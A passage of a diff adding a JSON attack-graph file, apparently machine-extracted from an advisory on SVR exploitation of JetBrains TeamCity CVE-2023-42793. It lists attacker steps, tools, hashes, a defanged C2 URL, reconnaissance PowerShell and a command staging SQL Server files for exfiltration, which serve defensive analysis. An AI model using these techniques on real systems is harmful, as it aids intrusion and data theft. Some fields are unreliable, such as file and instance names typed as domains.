@@ -1,0 +1,3055 @@
+{
+ "schema_version": "1.0",
+ "name": "csa-2023-231213",
+ "provenance": {
+  "input_kind": "markdown",
+  "input_sha256": "9f274e3f2377f70733c35f3afbe80eb324a9a9697d5892bf19693ee86f93a8e9",
+  "source_name": "csa-2023-231213"
+ },
+ "actions": [
+  {
+   "id": "a1",
+   "name": "Exploit JetBrains TeamCity CVE-2023-42793 for initial access",
+   "source": "llm",
+   "description": "The SVR started to exploit Internet-connected JetBrains TeamCity servers in late September 2023 using CVE-2023-42793, which enables bypassing authorization and arbitrary code execution on the server.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1190",
+   "attack_tactic": "initial-access",
+   "evidence_refs": [
+    "evidence-1"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a2",
+   "name": "Execute arbitrary code with high privileges on TeamCity server",
+   "source": "llm",
+   "description": "The TeamCity exploitation usually resulted in code execution with high privileges granting the SVR an advantageous foothold in the network environment.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1203",
+   "attack_tactic": "execution",
+   "evidence_refs": [
+    "evidence-2"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a3",
+   "name": "Perform host reconnaissance using built-in commands",
+   "source": "llm",
+   "description": "The SVR used basic built-in commands such as whoami, nltest, tasklist, netstat, and wmic to perform host reconnaissance.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1033",
+   "attack_tactic": "discovery",
+   "evidence_refs": [
+    "evidence-3"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a4",
+   "name": "Exfiltrate files from compromised hosts",
+   "source": "llm",
+   "description": "The SVR exfiltrated files such as ntoskrnl.exe, SQL Server executable files, Visual Studio files, and update management agent files to gain insight into the host system and software.",
+   "target_host_ref": "h2",
+   "attack_technique": "T1041",
+   "attack_tactic": "exfiltration",
+   "evidence_refs": [
+    "evidence-4"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a5",
+   "name": "Compress Microsoft SQL Server DLL files using PowerShell",
+   "source": "llm",
+   "description": "The SVR used PowerShell commands to compress Microsoft SQL Server DLL files into a zip archive.",
+   "target_host_ref": "h2",
+   "attack_technique": "T1059.001",
+   "attack_tactic": "execution",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a6",
+   "name": "Disable or kill endpoint detection and response (EDR) and antivirus (AV) software using 'Bring Your Own Vulnerable Driver' technique",
+   "source": "llm",
+   "description": "The SVR used an open source project called EDRSandBlast to remove protected process light (PPL) protection and inject code into AV/EDR processes to evade detection.",
+   "target_host_ref": "h2",
+   "attack_technique": "T1068",
+   "evidence_refs": [
+    "evidence-6"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a7",
+   "name": "Hide backdoors via DLL hijacking and masquerading",
+   "source": "llm",
+   "description": "The SVR abused DLL hijacking vulnerabilities in Zabbix and Webroot software and backdoored an open source Microsoft application named vcperf to hide backdoors.",
+   "target_host_ref": "h5",
+   "evidence_refs": [
+    "evidence-7"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a8",
+   "name": "Use Microsoft OneDrive and Dropbox cloud services as covert C2 channels",
+   "source": "llm",
+   "description": "The SVR used Microsoft OneDrive and Dropbox cloud services to exchange data with malware hidden inside randomly generated BMP files.",
+   "target_host_ref": "unknown",
+   "attack_technique": "T1564",
+   "evidence_refs": [
+    "evidence-8"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a9",
+   "name": "Perform privilege escalation using WinPEAS, NoLmHash registry modification, and Mimikatz",
+   "source": "llm",
+   "description": "The SVR used multiple techniques for privilege escalation including WinPEAS, modifying the NoLmHash registry key, and executing Mimikatz commands.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1098",
+   "attack_tactic": "privilege-escalation",
+   "evidence_refs": [
+    "evidence-9",
+    "evidence-10"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a10",
+   "name": "Establish persistence using scheduled tasks",
+   "source": "llm",
+   "description": "The SVR relied on scheduled tasks to secure persistent execution of backdoors, storing executables in various Windows directories and using schtasks.exe to create tasks.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1053.005",
+   "attack_tactic": "persistence",
+   "evidence_refs": [
+    "evidence-11"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a11",
+   "name": "Craft Ticket Granting Tickets (TGTs) using Rubeus toolkit",
+   "source": "llm",
+   "description": "To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs).",
+   "target_host_ref": "h1",
+   "attack_technique": "T1558.001",
+   "attack_tactic": "credential-access",
+   "evidence_refs": [
+    "evidence-12"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a12",
+   "name": "Exfiltrate Windows Registry hives",
+   "source": "llm",
+   "description": "The SVR exfiltrated Windows Registry hives SYSTEM, SAM, and SECURITY by saving them to files, compressing them, and exfiltrating using backdoor capability.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1003",
+   "attack_tactic": "credential-access",
+   "evidence_refs": [
+    "evidence-13"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a13",
+   "name": "Use SharpChromium tool to obtain sensitive browser data",
+   "source": "llm",
+   "description": "In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1555.003",
+   "attack_tactic": "credential-access",
+   "evidence_refs": [
+    "evidence-14"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a14",
+   "name": "Perform network reconnaissance using built-in commands and PowerSploit",
+   "source": "llm",
+   "description": "The SVR performed network reconnaissance using built-in commands and PowerSploit commands executed in memory, such as Get-NetComputer, Get-NetGroup, Get-NetUser, Get-NetDiDomain, Get-AdUser, and Get-DomainUser.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1590.004",
+   "evidence_refs": [
+    "evidence-15"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a15",
+   "name": "Establish tunnel to C2 infrastructure using modified Rsockstun tool (rr.exe)",
+   "source": "llm",
+   "description": "The SVR used a modified open source reverse socks tunneler named Rsockstunp (rr.exe) to establish a tunnel to the C2 infrastructure, executed either in memory or using WMIC.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1572",
+   "attack_tactic": "command-and-control",
+   "evidence_refs": [
+    "evidence-16",
+    "evidence-17"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a16",
+   "name": "Perform lateral movement using WMIC and registry modification",
+   "source": "llm",
+   "description": "The SVR used WMIC to facilitate lateral movement by executing commands remotely and modified the DisableRestrictedAdmin registry key to enable remote connections.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1047",
+   "evidence_refs": [
+    "evidence-18",
+    "evidence-19"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a17",
+   "name": "Use GraphicalProton backdoor for C2 communication",
+   "source": "llm",
+   "description": "The SVR used the GraphicalProton backdoor, which uses OneDrive, Dropbox, and randomly generated BMP files to exchange data with the SVR operator. It gathers environment information and uses cloud services as primary and backup communication channels.",
+   "target_host_ref": "h1",
+   "attack_technique": "T1027.001",
+   "attack_tactic": "defense-evasion",
+   "evidence_refs": [
+    "evidence-20"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a18",
+   "name": "Use GraphicalProton HTTPS variant for C2 communication",
+   "source": "llm",
+   "description": "The SVR introduced a variant of GraphicalProton backdoor that uses HTTPS requests to a re-registered expired domain with a dummy WordPress website as C2 channel, split into stager and encrypted binary files.",
+   "target_host_ref": "h1",
+   "attack_tactic": "command-and-control",
+   "evidence_refs": [
+    "evidence-21"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  }
+ ],
+ "relations": [
+  {
+   "id": "r1",
+   "from_action": "a1",
+   "to_action": "a2",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "arbitrary code execution on the server is enabled by exploiting CVE-2023-42793",
+   "evidence_refs": [
+    "evidence-1",
+    "evidence-22"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "r2",
+   "from_action": "a2",
+   "to_action": "a3",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "host reconnaissance is performed after gaining code execution foothold",
+   "evidence_refs": [
+    "evidence-23"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "r3",
+   "from_action": "a3",
+   "to_action": "a14",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "network reconnaissance is performed after host reconnaissance",
+   "evidence_refs": [
+    "evidence-24"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r4",
+   "from_action": "a2",
+   "to_action": "a6",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "disabling EDR/AV is done after gaining code execution foothold",
+   "evidence_refs": [
+    "evidence-25"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r5",
+   "from_action": "a6",
+   "to_action": "a7",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "hiding backdoors is done after disabling EDR/AV",
+   "evidence_refs": [
+    "evidence-26"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "r6",
+   "from_action": "a7",
+   "to_action": "a17",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "GraphicalProton backdoor is used after hiding backdoors via DLL hijacking",
+   "evidence_refs": [
+    "evidence-27"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "r7",
+   "from_action": "a17",
+   "to_action": "a8",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "GraphicalProton uses OneDrive and Dropbox cloud services as covert C2 channels",
+   "evidence_refs": [
+    "evidence-28"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r8",
+   "from_action": "a2",
+   "to_action": "a9",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "privilege escalation is performed after gaining code execution foothold",
+   "evidence_refs": [
+    "evidence-29"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "r9",
+   "from_action": "a9",
+   "to_action": "a11",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "crafting TGTs is done after privilege escalation",
+   "evidence_refs": [
+    "evidence-12"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r10",
+   "from_action": "a2",
+   "to_action": "a10",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "establishing persistence is done after gaining code execution foothold",
+   "evidence_refs": [
+    "evidence-30"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r11",
+   "from_action": "a2",
+   "to_action": "a4",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "exfiltration of files is done after gaining code execution foothold",
+   "evidence_refs": [
+    "evidence-31"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r12",
+   "from_action": "a4",
+   "to_action": "a5",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "compressing SQL Server DLL files is done to prepare files for exfiltration",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r13",
+   "from_action": "a4",
+   "to_action": "a12",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "exfiltrating Windows Registry hives is a form of file exfiltration",
+   "evidence_refs": [
+    "evidence-32"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "r14",
+   "from_action": "a2",
+   "to_action": "a16",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "lateral movement is performed after gaining code execution foothold",
+   "evidence_refs": [
+    "evidence-33"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r15",
+   "from_action": "a16",
+   "to_action": "a15",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "tunneling to C2 infrastructure is done after lateral movement tools are used",
+   "evidence_refs": [
+    "evidence-34"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r16",
+   "from_action": "a7",
+   "to_action": "a18",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "GraphicalProton HTTPS variant is a variant of GraphicalProton backdoor",
+   "evidence_refs": [
+    "evidence-35"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r17",
+   "from_action": "a3",
+   "to_action": "a13",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "narrative order only",
+   "evidence_refs": [],
+   "epistemic_status": "inferred"
+  }
+ ],
+ "hosts": [
+  {
+   "id": "h1",
+   "role": "Internet-connected JetBrains TeamCity servers exploited for initial access",
+   "source": "llm",
+   "name": "JetBrains TeamCity server",
+   "os": "Windows",
+   "evidence_refs": [
+    "evidence-36",
+    "evidence-37",
+    "evidence-38"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "h2",
+   "role": "Hosts running Microsoft SQL Server targeted for file exfiltration and compression",
+   "source": "llm",
+   "name": "Compromised hosts with Microsoft SQL Server",
+   "os": "Windows",
+   "evidence_refs": [
+    "evidence-39",
+    "evidence-5"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "h3",
+   "role": "Hosts with Zabbix software abused via DLL hijacking to hide backdoors",
+   "source": "llm",
+   "name": "Hosts running Zabbix software",
+   "os": "Windows",
+   "evidence_refs": [
+    "evidence-40"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "h4",
+   "role": "Hosts with Webroot AV abused via DLL hijacking to hide backdoors",
+   "source": "llm",
+   "name": "Hosts running Webroot antivirus software",
+   "os": "Windows",
+   "evidence_refs": [
+    "evidence-41"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "h5",
+   "role": "Hosts running open source Microsoft application vcperf backdoored to hide backdoors",
+   "source": "llm",
+   "name": "Hosts running Microsoft vcperf application",
+   "os": "Windows",
+   "evidence_refs": [
+    "evidence-42"
+   ],
+   "epistemic_status": "insufficient"
+  }
+ ],
+ "services": [
+  {
+   "id": "s1",
+   "name": "JetBrains TeamCity",
+   "source": "llm",
+   "host_ref": "h1",
+   "evidence_refs": [
+    "evidence-36"
+   ],
+   "epistemic_status": "supported",
+   "cve": [
+    "CVE-2023-42793"
+   ],
+   "field_sources": {
+    "cve": "source_quote"
+   }
+  },
+  {
+   "id": "s2",
+   "name": "Microsoft SQL Server",
+   "source": "llm",
+   "host_ref": "h2",
+   "evidence_refs": [
+    "evidence-43"
+   ],
+   "epistemic_status": "insufficient"
+  }
+ ],
+ "target_context": {
+  "host_refs": [
+   "h1",
+   "h2",
+   "h3",
+   "h4",
+   "h5"
+  ],
+  "service_refs": [
+   "s1",
+   "s2"
+  ]
+ },
+ "artifacts": [
+  {
+   "name": "EDRSandBlast",
+   "type": "tool",
+   "id": "art1",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-44"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "GraphicalProton backdoor",
+   "type": "malware",
+   "id": "art2",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-45"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "vcperf (backdoored)",
+   "type": "tool",
+   "id": "art3",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-46"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "Rubeus toolkit",
+   "type": "tool",
+   "id": "art4",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-47"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "SharpChromium",
+   "type": "tool",
+   "id": "art5",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-48"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "Rsockstun (rr.exe)",
+   "type": "tool",
+   "id": "art6",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-49"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "Mimikatz",
+   "type": "tool",
+   "id": "art7",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-50"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "Scheduled tasks",
+   "type": "artifact",
+   "id": "art8",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-51"
+   ],
+   "epistemic_status": "insufficient"
+  }
+ ],
+ "indicators": [
+  {
+   "id": "indicator-1",
+   "type": "cve",
+   "value": "CVE-2023-42793",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-52",
+    "evidence-53",
+    "evidence-54",
+    "evidence-55",
+    "evidence-56",
+    "evidence-57"
+   ]
+  },
+  {
+   "id": "indicator-2",
+   "type": "domain",
+   "value": "MSSQL14.MSSQLSERVER",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-58",
+    "evidence-59"
+   ]
+  },
+  {
+   "id": "indicator-3",
+   "type": "domain",
+   "value": "internal.properties",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-60"
+   ]
+  },
+  {
+   "id": "indicator-4",
+   "type": "hash",
+   "value": "01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-61"
+   ]
+  },
+  {
+   "id": "indicator-5",
+   "type": "hash",
+   "value": "34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-62"
+   ]
+  },
+  {
+   "id": "indicator-6",
+   "type": "hash",
+   "value": "620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-63"
+   ]
+  },
+  {
+   "id": "indicator-7",
+   "type": "hash",
+   "value": "773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-64"
+   ]
+  },
+  {
+   "id": "indicator-8",
+   "type": "hash",
+   "value": "7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-65"
+   ]
+  },
+  {
+   "id": "indicator-9",
+   "type": "hash",
+   "value": "8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-66"
+   ]
+  },
+  {
+   "id": "indicator-10",
+   "type": "hash",
+   "value": "971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-67"
+   ]
+  },
+  {
+   "id": "indicator-11",
+   "type": "hash",
+   "value": "CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-68",
+    "evidence-69"
+   ]
+  },
+  {
+   "id": "indicator-12",
+   "type": "hash",
+   "value": "CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-70"
+   ]
+  },
+  {
+   "id": "indicator-13",
+   "type": "hash",
+   "value": "EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-71"
+   ]
+  },
+  {
+   "id": "indicator-14",
+   "type": "hash",
+   "value": "F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-72"
+   ]
+  },
+  {
+   "id": "indicator-15",
+   "type": "hash",
+   "value": "C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-73"
+   ]
+  },
+  {
+   "id": "indicator-16",
+   "type": "hash",
+   "value": "4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-74"
+   ]
+  },
+  {
+   "id": "indicator-17",
+   "type": "hash",
+   "value": "18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-75"
+   ]
+  },
+  {
+   "id": "indicator-18",
+   "type": "hash",
+   "value": "19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-76"
+   ]
+  },
+  {
+   "id": "indicator-19",
+   "type": "hash",
+   "value": "1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-77"
+   ]
+  },
+  {
+   "id": "indicator-20",
+   "type": "hash",
+   "value": "219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-78"
+   ]
+  },
+  {
+   "id": "indicator-21",
+   "type": "hash",
+   "value": "92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-79"
+   ]
+  },
+  {
+   "id": "indicator-22",
+   "type": "hash",
+   "value": "B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-80"
+   ]
+  },
+  {
+   "id": "indicator-23",
+   "type": "hash",
+   "value": "C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-81"
+   ]
+  },
+  {
+   "id": "indicator-24",
+   "type": "hash",
+   "value": "C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-82"
+   ]
+  },
+  {
+   "id": "indicator-25",
+   "type": "hash",
+   "value": "C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-83"
+   ]
+  },
+  {
+   "id": "indicator-26",
+   "type": "hash",
+   "value": "F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-84"
+   ]
+  },
+  {
+   "id": "indicator-27",
+   "type": "hash",
+   "value": "D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-85"
+   ]
+  },
+  {
+   "id": "indicator-28",
+   "type": "hash",
+   "value": "4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-86"
+   ]
+  },
+  {
+   "id": "indicator-29",
+   "type": "hash",
+   "value": "950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-87"
+   ]
+  },
+  {
+   "id": "indicator-30",
+   "type": "ip",
+   "value": "103.76.128.34",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-88"
+   ]
+  },
+  {
+   "id": "indicator-31",
+   "type": "url",
+   "value": "HXXPS://MATCLICK[.]COM/WP-QUERY[.]PHP",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-89"
+   ]
+  },
+  {
+   "id": "indicator-32",
+   "type": "domain",
+   "value": "MATCLICK[.]COM",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-90"
+   ]
+  },
+  {
+   "id": "indicator-33",
+   "type": "domain",
+   "value": "WP-QUERY[.]PHP",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-91"
+   ]
+  }
+ ],
+ "commands": [
+  {
+   "id": "command-1",
+   "interpreter": "powershell",
+   "command": "powershell Get-WmiObject -Class Win32_Service -Computername ▪",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-92"
+   ]
+  },
+  {
+   "id": "command-2",
+   "interpreter": "powershell",
+   "command": "powershell Get-WindowsDriver -Online -All",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-93",
+    "evidence-94"
+   ]
+  },
+  {
+   "id": "command-3",
+   "interpreter": "powershell",
+   "command": "powershell Get-WmiObject -Class Win32_Service -Computername •",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-95"
+   ]
+  }
+ ],
+ "evidence": [
+  {
+   "id": "evidence-1",
+   "quote": "The SVR started to exploit Internet-connected JetBrains TeamCity servers in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The SVR started to exploit Internet connected JetBrains TeamCity servers in late September 2023 using CVE 2023 42793, which enables the insecure handling of spe"
+  },
+  {
+   "id": "evidence-2",
+   "quote": "The TeamCity exploitation usually resulted in code execution with high privileges granting the SVR an advantageous foothold in the network environment.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "he TeamCity exploitation usually resulted in code execution with high privileges granting the SVR an advantageous foothold in the network environment."
+  },
+  {
+   "id": "evidence-3",
+   "quote": "Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance,,: whoami /priv, whoami /all, whoami /groups, whoami /domain, nltest -dclist, nltest -dsgetdc, tasklist, netstat, wmic ...",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "Initial observations show the SVR used the following basic, built in commands to perform host reconnaissance,,: "
+  },
+  {
+   "id": "evidence-4",
+   "quote": "Additionally, the authoring agencies have observed the SVR exfiltrating files which may provide insight into the host system’s operating system: C:\\Windows\\system32\\ntoskrnl.exe ... SQL Server executable files ... Visual Studio files ... Update management agent files ...",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "Additionally, the authoring agencies have observed the SVR exfiltrating files which may provide insight into the host system’s operating system: "
+  },
+  {
+   "id": "evidence-5",
+   "quote": "powershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\", ... -DestinationPath C:\\Windows\\temp\\1\\sql.zip",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "13"
+   },
+   "quote_verified": true,
+   "quote_match": "strong",
+   "match_score": 1.0,
+   "matched_text": "powershell Compress Archive Path \"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\", … DestinationPath C:\\Windows\\temp\\1\\sql.zip"
+  },
+  {
+   "id": "evidence-6",
